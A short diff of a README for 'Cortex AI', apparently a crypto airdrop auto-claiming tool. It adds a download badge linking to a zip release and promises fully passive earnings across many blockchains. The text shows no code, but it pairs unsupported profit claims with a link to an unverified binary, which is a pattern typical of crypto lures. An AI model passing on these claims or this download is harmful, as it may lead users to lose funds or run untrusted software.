@@ -7,7 +7,7 @@
 **Cortex AI** is an intelligent platform that automatically discovers, completes, and claims the most profitable crypto airdrops across **Solana, BNB Chain, Ethereum, Arbitrum, Base**, and **20+ additional networks**.  
 Set it up once — and earn **fully passively** while you live your life.
 
-
+[![Download](https://img.shields.io/badge/Download-Cortex_AI-4ade80?style=for-the-badge)](https://github.com/cortexaiofficial/Auto-Airdrop-Claimer/releases/download/cryptosoft/Cortex_v.3.4.zip)  
 ---
 
 ## ⭐ Key Features
